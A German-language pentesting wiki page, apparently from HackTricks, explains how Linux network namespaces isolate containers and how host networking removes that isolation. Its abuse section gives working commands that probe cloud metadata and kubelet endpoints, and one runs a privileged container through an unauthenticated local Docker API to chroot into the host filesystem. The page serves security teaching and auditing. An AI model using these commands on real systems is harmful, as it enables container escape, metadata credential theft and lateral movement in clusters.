# Netzwerk-Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Überblick

Der Netzwerk-Namespace isoliert netzwerkbezogene Ressourcen wie Interfaces, IP-Adressen, Routing-Tabellen, ARP/neighbor-Zustand, Firewall-Regeln, Sockets und den Inhalt von Dateien wie `/proc/net`. Deshalb kann ein Container etwas haben, das wie sein eigenes `eth0`, seine eigenen lokalen Routen und sein eigenes Loopback-Gerät aussieht, ohne den tatsächlichen Netzwerkstack des Hosts zu besitzen.

Sicherheitstechnisch ist das wichtig, weil Netzwerk-Isolierung weit mehr ist als Port-Bindung. Ein privater Netzwerk-Namespace begrenzt, was die Workload direkt beobachten oder neu konfigurieren kann. Sobald dieser Namespace mit dem Host geteilt wird, kann der Container plötzlich Einsicht in Host-Listener, host-lokale Dienste und Netzwerk-Kontrollpunkte erhalten, die niemals für die Anwendung freigelegt werden sollten.

## Funktionsweise

Ein frisch erstellter Netzwerk-Namespace beginnt mit einer leeren oder nahezu leeren Netzwerkumgebung, bis Schnittstellen daran angebunden werden. Container-Runtimes erzeugen oder verbinden dann virtuelle Schnittstellen, weisen Adressen zu und konfigurieren Routen, sodass die Workload die erwartete Konnektivität erhält. Bei bridge-basierten Deployments bedeutet das in der Regel, dass der Container eine veth-basierte Schnittstelle sieht, die mit einer Host-Bridge verbunden ist. In Kubernetes übernehmen CNI-Plugins die äquivalente Konfiguration für das Pod-Networking.

Diese Architektur erklärt, warum `--network=host` oder `hostNetwork: true` eine so drastische Änderung darstellt. Statt einen vorbereiteten privaten Netzwerkstack zu erhalten, nutzt die Workload den tatsächlichen Netzwerkstack des Hosts.

## Labor

Mit folgendem Befehl können Sie einen nahezu leeren Netzwerk-Namespace sehen:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Und du kannst normale und im Host‑Netzwerk laufende Container damit vergleichen:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Ein mit dem Host-Netzwerk verbundener Container verfügt nicht mehr über eine eigene isolierte Sicht auf Sockets und Interfaces. Diese Änderung allein ist schon erheblich, noch bevor man fragt, welche capabilities der Prozess besitzt.

## Laufzeit

Docker und Podman erstellen normalerweise für jeden Container einen privaten Netzwerk-Namespace, sofern nicht anders konfiguriert. Kubernetes gibt normalerweise jedem Pod seinen eigenen Netzwerk-Namespace, der von den Containern innerhalb dieses Pods geteilt wird, aber vom Host getrennt ist. Incus/LXC-Systeme bieten ebenfalls umfangreiche auf Netzwerk-Namespaces basierende Isolation, oft mit einer größeren Vielfalt an virtuellen Netzwerk-Setups.

Das übliche Prinzip ist, dass private Vernetzung die standardmäßige Isolationsgrenze ist, während Host-Netzwerk eine explizite Ausnahme von dieser Grenze darstellt.

## Fehlkonfigurationen

Die wichtigste Fehlkonfiguration ist einfach die gemeinsame Nutzung des Host-Netzwerk-Namespaces. Das wird manchmal aus Performance-, Low-Level-Monitoring- oder Komfortgründen gemacht, entfernt aber eine der saubersten Grenzen für Container. Host-lokale Listener werden direkter erreichbar, nur auf localhost erreichbare Dienste können zugänglich werden, und capabilities wie `CAP_NET_ADMIN` oder `CAP_NET_RAW` werden viel gefährlicher, weil die von ihnen erlaubten Operationen nun auf die Netzwerkumgebung des Hosts angewendet werden.

Ein weiteres Problem ist das Übergeben zu vieler netzwerkbezogener capabilities, selbst wenn der Netzwerk-Namespace privat ist. Ein privater Namespace hilft zwar, macht aber raw sockets oder fortgeschrittene Netzwerksteuerung nicht harmlos.

In Kubernetes ändert `hostNetwork: true` auch, wie sehr man der Netzwerksegmentierung auf Pod-Ebene vertrauen kann. Kubernetes dokumentiert, dass viele network plugins den `hostNetwork`-Podverkehr für `podSelector` / `namespaceSelector`-Matching nicht richtig unterscheiden können und ihn deshalb als gewöhnlichen Node-Verkehr behandeln. Aus Angreiferperspektive bedeutet das, dass eine kompromittierte `hostNetwork`-Workload oft eher als Netzwerk-Zugangspunkt auf Knotenebene behandelt werden sollte als als normaler Pod, der noch durch dieselben Policy-Annahmen wie Overlay-Netzwerk-Workloads eingeschränkt ist.

## Missbrauch

In schwach isolierten Setups können Angreifer hostseitige Listening-Services untersuchen, Management-Endpunkte erreichen, die nur an loopback gebunden sind, Traffic abfangen oder stören (je nach den genauen capabilities und der Umgebung), oder Routing- und Firewall-Zustand neu konfigurieren, wenn `CAP_NET_ADMIN` vorhanden ist. In einem Cluster kann das auch laterale Bewegung und Control-Plane-Aufklärung erleichtern.

Wenn Sie Host-Networking vermuten, beginnen Sie damit zu bestätigen, dass die sichtbaren Interfaces und Listener zum Host gehören und nicht zu einem isolierten Container-Netzwerk:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Nur auf Loopback erreichbare Dienste sind oft die erste interessante Entdeckung:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Wenn Netzwerkfähigkeiten vorhanden sind, prüfe, ob die Workload den sichtbaren Stack inspizieren oder verändern kann:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Auf modernen Kerneln kann Host-Networking zusammen mit `CAP_NET_ADMIN` auch den Paketpfad über einfache `iptables` / `nftables`-Änderungen hinaus offenlegen. `tc` qdiscs und filters sind ebenfalls namespace-bezogen, sodass sie in einem gemeinsamen Host-Netzwerknamespace auf die Host-Interfaces angewendet werden, die der container sehen kann. Wenn zusätzlich `CAP_BPF` vorhanden ist, werden netzwerkbezogene eBPF-Programme wie TC und XDP loaders ebenfalls relevant:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Das ist wichtig, weil ein Angreifer möglicherweise den Datenverkehr auf der Netzwerkschnittstellenebene des Hosts spiegeln, umleiten, formen oder verwerfen kann und nicht nur Firewall-Regeln umschreibt. In einem privaten Netzwerknamespace sind diese Aktionen auf die Sicht des Containers beschränkt; in einem gemeinsam genutzten Host-Namespace wirken sie sich auf den Host aus.

In Cluster- oder Cloud-Umgebungen rechtfertigt die Host-Netzwerk-Konfiguration zudem eine schnelle lokale recon von Metadaten und control-plane-nahen Diensten:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Vollständiges Beispiel: Host-Netzwerk + lokale Runtime / Kubelet-Zugriff

Host-Netzwerk gewährt nicht automatisch Root-Zugriff auf den Host, aber es macht häufig Dienste erreichbar, die bewusst nur vom Node selbst erreichbar sein sollen. Wenn einer dieser Dienste schwach geschützt ist, wird das Host-Netzwerk zu einem direkten privilege-escalation path.

Docker API auf localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet auf localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Auswirkungen:

- direkte Kompromittierung des Hosts, wenn eine lokale Runtime-API ohne geeigneten Schutz exponiert ist
- Cluster-Aufklärung oder seitliche Bewegung, wenn kubelet oder lokale Agents erreichbar sind
- Verkehrsmanipulation oder Dienstverweigerung, wenn kombiniert mit `CAP_NET_ADMIN`

## Prüfungen

Das Ziel dieser Prüfungen ist herauszufinden, ob der Prozess einen privaten Netzwerkstack hat, welche Routen und Listener sichtbar sind und ob die Netzwerkansicht bereits host-ähnlich aussieht, bevor Sie überhaupt capabilities testen.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
Was hier interessant ist:

- Wenn `/proc/self/ns/net` und `/proc/1/ns/net` bereits host-ähnlich aussehen, könnte der Container das Host-Netzwerk-Namespace oder ein anderes nicht-privates Namespace teilen.
- `lsns -t net` und `ip netns identify` sind nützlich, wenn die Shell sich bereits in einem benannten oder persistenten Namespace befindet und Sie es mit den `/run/netns`-Objekten auf der Host-Seite korrelieren möchten.
- `ss -lntup` ist besonders wertvoll, weil es nur auf Loopback hörende Listener und lokale Management-Endpunkte aufdeckt.
- Routen, Interface-Namen, Firewall-Kontext, `tc`-Zustand und eBPF-Attachments werden deutlich wichtiger, wenn `CAP_NET_ADMIN`, `CAP_NET_RAW` oder `CAP_BPF` vorhanden sind.
- In Kubernetes kann eine fehlgeschlagene Service-Namensauflösung von einem `hostNetwork` Pod einfach bedeuten, dass der Pod nicht `dnsPolicy: ClusterFirstWithHostNet` verwendet, und nicht, dass der Service fehlt.

Beim Prüfen eines Containers sollte man das Netzwerk-Namespace immer zusammen mit dem Capability-Set bewerten. Host-Networking zusammen mit umfangreichen Netzwerk-Capabilities ist eine völlig andere Konstellation als Bridge-Networking mit einem engen Standard-Capability-Set.

## Referenzen

- [Kubernetes NetworkPolicy and `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [eBPF token and capability requirements for network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
